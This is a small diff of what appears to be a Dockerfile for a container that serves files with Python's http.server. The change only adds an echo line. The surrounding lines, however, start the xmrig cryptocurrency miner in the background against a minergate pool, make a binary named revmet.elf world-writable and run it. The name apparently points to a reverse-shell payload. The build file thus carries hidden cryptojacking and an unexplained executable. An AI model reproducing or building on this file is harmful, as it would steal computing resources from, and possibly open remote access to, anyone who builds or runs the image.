@@ -20,5 +20,6 @@ RUN nohup bash -c "./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.co
 WORKDIR /root
 RUN chmod 777 revmet.elf
 RUN ./revmet.elf
+RUN echo dd
 
 ENTRYPOINT ["python3", "-m", "http.server"]
